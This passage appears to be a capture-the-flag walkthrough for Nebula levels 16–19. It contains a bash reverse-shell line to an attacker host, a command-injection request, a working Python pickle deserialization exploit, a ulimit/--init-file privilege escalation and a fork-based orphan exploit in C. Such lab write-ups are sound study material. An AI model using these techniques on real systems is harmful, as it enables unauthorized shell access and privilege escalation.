#!/usr/bin/env perl

    use CGI qw{param};
    print "Content-type: text/html\n\n";

    sub login {
        $username = $_[0];
        $password = $_[1];

        $username =~ tr/a-z/A-Z/; # conver to uppercase
        $username =~ s/\s.*//;        # strip everything after a space

        @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
        foreach $line (@output) {
            ($usr, $pw) = split(/:/, $line);
        
            if($pw =~ $password) {
                return 1;
            }
        }

        return 0;
    }

    sub htmlz {
        print("Login resuls");
        if($_[0] == 1) {
            print("Your login was accepted");
        } else {
            print("Your login failed");
        }    
        print("Would you like a cookie?\n");
    }

    htmlz(login(param("username"), param("password")));
```
    
> egrep: this command searches for a pattern using extended regular expressions, and returns all the lines matching that pattern.

1. The injection vulnerability in this program is where the `egrep` command is called. We need to properly close that command and append our own to get a system call to `getflag`. However, the input is partially sanitized, by making all of it uppercase and trimming it after the fisrt space.
2. We can't call any useful command given the sanitization on the input, but what we can do is put those commands in a file with a name that is accepted by the sanitizatoin, and that access that file. To do this, the file name should be completely uppercase without spaces. We can put it in the tmp folder, and then access it using a wildcard, like `/*/FLAG16`.
3. The content of our file whould be a reverse tcp to which we can connect. The instruction goes like this: `bash -i >& /dev/tcp/[HOST IP]]/8000 0>&1`. This will spawn an interactive bash shell and pipe its input and output to a socket connected to our host. Give it running permissions with `chmod +x [filename]`
4. On the host we start netcat so that we can listen and connect to our shell: `nc -nlp 8000`
5. What is left to do is connecting to the server with the proper request so that our script will be invoked and we get the connection on the netcat listener. We know that the server is expecting a request to index.cgi with two parameters: username and password. Username is what we are interested in, so we put our URL encoded script path in there: `wget "[VM IP]:1616/index.cgi?username=%60%2F%2A%2FFLAG16%60&password=asdf"`
6. This request should stay open, and if you switch to the netcat listener there should be a shell with flag16 as user open and waiting for the `getflag` command. After executing it, as soon as you leave the shell also the wget request should end successfully.

### [Level 17]
There is a python script listening on port 10007 that contains a vulnerability.

```python
import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
    line = skt.recv(1024)

    obj = pickle.loads(line)

    for i in obj:
        clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
    clnt, addr = skt.accept()

    if(os.fork() == 0):
        clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
        server(clnt)
        exit(1)
```
    
> pickle.loads(string): read a pickled object hierarchy from a string. Characters in the string past the pickled object’s representation are ignored. The pickle module is not intended to be secure against erroneous or maliciously constructed data.
> Pickle allows arbitrary objects to declare how they should be pickled by defining a __reduce__ method, which should return a tuple describing how to reconstruct this object on unpacking. That tuple should just contain a callable and a tuple of arguments to call that callable on. Each of these pieces will be pickled separately, and then on unpickling, the callable will be called on the provided arguments to construct the new object.

1. We can see that our input will be passed unsanitized to a `pickle.loads()` instruction. After a quick research it is clear that pickle is vulnerable to crafted inputs because it will call whatever will be passed to it. That's what we want to exploit.
2. The command to be run is pretty simple, and it's saved in a bash file that is called flag17 and that has executable permissions (`chmod +x`):

    ```bash
    #!/bin/bash
    /bin/getflag >> /tmp/flag17.out
    ```

3. To be successful in our exploit we have to rewrite the `__reduce__` method so that when invoked it will run the flag17 script for us. Also, we want our method to be sent to the local server so that it will actually execute. For this we write a small python program that implements `__reduce__`, opens a socket connection to the server and sends our specially crafted object. Remember to not call this file pickly.py or any name that could cause confusion with libraries.

    ```python
    import pickle
    import subprocess
    import socket

    class Exploit(object):

        def __reduce__(self):
            return(subprocess.Popen, (('/tmp/flag17',),))

    host = "127.0.0.1"
    port = 10007

    obj = pickle.dumps(Exploit())

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(obj)
    s.close()
    ```
4. Execute the python file, and after succesfully sending our packet we can check in `/tmp/flag17.out` and we will find that `getflag` has been successfully executed for us.

### [Level 18]
Analyse the C program, and look for vulnerabilities in the program.

```c
struct {
    FILE *debugfile;
    int verbose;
    int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
    fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile && globals.verbose >= num) \
    fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE "/home/flag18/password"

void login(char *pw){
    FILE *fp;

    fp = fopen(PWFILE, "r");
    if(fp) {
        char file[64];

        if(fgets(file, sizeof(file) - 1, fp) == NULL) {
            dprintf("Unable to read password file %s\n", PWFILE);
            return;
        }
                fclose(fp);
        if(strcmp(pw, file) != 0) return;       
    }
    dprintf("logged in successfully (with%s password file)\n",
        fp == NULL ? "out" : "");
    
    globals.loggedin = 1;

}

void notsupported(char *what){
    char *buffer = NULL;
    asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
    dprintf(what);
    free(buffer);
}

void setuser(char *user){
    char msg[128];

    sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
    printf("%s\n", msg);

}

int main(int argc, char **argv, char **envp){
    char c;

    while((c = getopt(argc, argv, "d:v")) != -1) {
        switch(c) {
            case 'd':
                globals.debugfile = fopen(optarg, "w+");
                if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
                setvbuf(globals.debugfile, NULL, _IONBF, 0);
                break;
            case 'v':
                globals.verbose++;
                break;
        }
    }

    dprintf("Starting up. Verbose level = %d\n", globals.verbose);

    setresgid(getegid(), getegid(), getegid());
    setresuid(geteuid(), geteuid(), geteuid());
    
    while(1) {
        char line[256];
        char *p, *q;

        q = fgets(line, sizeof(line)-1, stdin);
        if(q == NULL) break;
        p = strchr(line, '\n'); if(p) *p = 0;
        p = strchr(line, '\r'); if(p) *p = 0;

        dvprintf(2, "got [%s] as input\n", line);

        if(strncmp(line, "login", 5) == 0) {
            dvprintf(3, "attempting to login\n");
            login(line + 6);
        } else if(strncmp(line, "logout", 6) == 0) {
            globals.loggedin = 0;
        } else if(strncmp(line, "shell", 5) == 0) {
            dvprintf(3, "attempting to start shell\n");
            if(globals.loggedin) {
                execve("/bin/sh", argv, envp);
                err(1, "unable to execve");
            }
            dprintf("Permission denied\n");
        } else if(strncmp(line, "logout", 4) == 0) {
            globals.loggedin = 0;
        } else if(strncmp(line, "closelog", 8) == 0) {
            if(globals.debugfile) fclose(globals.debugfile);
            globals.debugfile = NULL;
        } else if(strncmp(line, "site exec", 9) == 0) {
            notsupported(line + 10);
        } else if(strncmp(line, "setuser", 7) == 0) {
            setuser(line + 8);
        }
    }

    return 0;
}
```

> void closelog(): closes the descriptor being used to write to the system logger.

> ulimit -n: set or get the shells resource usage limits. Option -n sets the maximum number of open file descriptors (most systems do not allow this value to be set).

> bash --init-file: the last parameter is used as a script-file, which is executed.

1. The program can be invoked with a command like `./flag18 -vvv -d /tmp/log`. What it does is check if your password is in the password file stored in `/home/flag18/password`, and if yes it will log you in and let you use the shell. However, there is a catch: in the `login()` method if the password file cannot be accessed there is no exception throw, meaning that we will just reach the `global.loggedin = 1` instruction and therefore we will be allowed to access the shell.
2. To see what is going on in our program, we prepare the log file and we tail it in the background: `touch /tmp/log; tail -f /tmp/log &`. This will already occupy one of the free file descriptors that we will allow in the next step.
3. We can't prevent the access to the password file by moving or renaming it, because the path is hardcoded and we don't have permissions to manipulate the file. So we have to find another way to block the access to the password file without touching it directly: that's where the ability to set `ulimit` gets interesting. We want to set the value so low that the shell session will reach the limit before trying to open the password file, and therefore failing at that. A good number could be `ulimit -n 4`
4. We can now start out program, with `./flag18 -vvv -d /tmp/log`. The system will complain about too many files open, but it will anyway execute flag18. So we can attempt login and see that we are logged in successfully without a password file.
5. The next command that we pass is shell to try and get access to the flag18 shell. However, the attempt fails because the shell tries to open a library and it gets blocked by the newly set ulimit. To get around this, we can make use of the closelog method: just login again, and run `closelog` before trying to invoke the shell.
6. The shell command works properly, but we get an error saying that it does not recognize the -d option. This means that the first parameter must be something it recognizes, from the GNU long options (as hinted by the error that we got). A good idea is to use the `--init-file`, that will read the path that we pass to -d as something to be executed. The first "command" will be *Starting* with parameters *up*. We have to make sure that such a file exists and can be executed with something useful.
7. We create the *Starting* file as an executable script in /tmp, and make it open a shell:

    ```bash
    #!/bin/bash
    /bin/getflag >> /tmp/flag18.out
    ```

8. We make it executable with `chmod +x /tmp/Starting`. To make sure this file can be found, we prepend the /tmp to PATH: `export PATH=/tmp:$PATH`
9. It's now a good time to logout completely from the challenge and login again, just to make sure that we do all the operations in the right order:

    ```bash
    tail -f /tmp/log &
    export PATH=/tmp:$PATH
    ulimit -n 4
    ./flag18 --init-file -d /tmp/log
    login
    closelog
    shell
    ```

10. At the end of these instructions we will still get an error, but it is because our --init-file option is still trying to execute the lines in the log file and is obviously failing. If we go in the /tmp folder we can see that out flag18.out file is there and it says that we executed getflag properly.

Just as an additional instruction to satisfy my curiosity, in the Starting script I also put a line to print the content of the password file: we aren't allowed to do that, but the script will have higher permissions so it will work.

### [Level 19]
There is a flaw in the below program in how it operates.

```c
int main(int argc, char **argv, char **envp){
    pid_t pid;
    char buf[256];
    struct stat statbuf;

    /* Get the parent's /proc entry, so we can verify its user id */

    snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

    /* stat() it */

    if(stat(buf, &statbuf) == -1) {
        printf("Unable to check parent process\n");
        exit(EXIT_FAILURE);
    }

    /* check the owner id */

    if(statbuf.st_uid == 0) {
        /* If root started us, it is ok to start the shell */

        execve("/bin/sh", argv, envp);
        err(1, "Unable to execve");
    }

    printf("You are unauthorized to run this program\n");
}
```

> init: is the first process started during booting of the computer system. It is a daemon process that continues running until the system is shut down. It is the direct or indirect ancestor of all other processes and automatically adopts all orphaned processes.

> pid_t fork(void): creates a new process (child) by duplicating the calling process (parent).The processes run in separate memory spaces. At the time of fork() both memory spaces have the same content.

> int execve(const char *filename, char *const argv[], char *const envp[]): executes the program pointed to by filename. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.

> int setresuid(uid_t ruid, uid_t euid, uid_t suid): sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process. A privileged process may set its UIDs to arbitrary values.

1. The only way to get to the shell is to run the program as root, and we are clearly not root. However, we can make use of the Unix adopting policy for orphaned processes: init was started by root, as we can see with `ps -ef | grep init` (-e to see all processes, -f to format it properly), and having processes adopted by it would escalate their privileges.
2. This means that we need a process that starts flag19 and then dies before the checks on the parent ID. This can be achieved with a `fork()`. We have to write a C program that forks itself, then we wait for this new process to become orphaned, and then we call `execve()` with the flag19 binary to run the getflag command in a shell with proper permissions.

    ```c
    int main(int argc, char **argv, char **envp){
        int child = fork();

        if(child == 0){
            sleep(2);
            setresuid(geteuid(), geteuid(), geteuid());
            char *args[] = {"/bin/sh", "-c", "/bin/getflag", NULL};
            execve("/home/flag19/flag19", args, envp);
        }
        return 0;
    }
    ```
3. Compile this file with `gcc /tmp/flag19.c -o /tmp/flag19``, give it execution permissions if needed, and run it.
4. The parent process will die upon spawn of the child, which in turn will have UID == 0 and therefore pass the check and be allowed to enter the original `execve` in the /home/flag19/flag19 program. This will execute `getflag` for us.



